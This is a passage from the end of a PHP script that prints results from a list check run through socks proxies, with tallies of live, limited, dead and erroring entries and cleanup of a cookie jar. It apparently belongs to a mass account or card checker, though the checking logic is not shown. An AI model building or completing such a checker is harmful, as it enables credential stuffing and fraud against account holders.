			echo $slist[$i]." <font color=orange> <<< Time Out</font><br>";

		}

		flush();

		sleep(1);

	}

	if($maxs > count($slist)){

		echo "<font color=blue><b>Over Sock !!!</b></font>";

	}else{

		echo "<font color=blue><b>Tool use to sock:".$_sockcheckto."</b></font>";

	}

	unlink($cookiejar);



	echo "<hr>";

	echo "<center><font size=5 color=blue>Total : <font size=6 color=red>".count($mlist)."</font> | Live : <font color=red size=6>".$sllive."</font> | Limit : <font color=red size=6>".$sllimit."</font> | Die : <font color=red size=6>".$sldie."</font> | Error : <font color=red size=6>".$slerror."</font></font></center><hr>";

	echo $tslive;

	echo "<hr>";

	echo $tslimit;

	echo "<hr>";

	echo $tsdie;

	echo "<hr>";

	echo $tserror;

	

}

?>
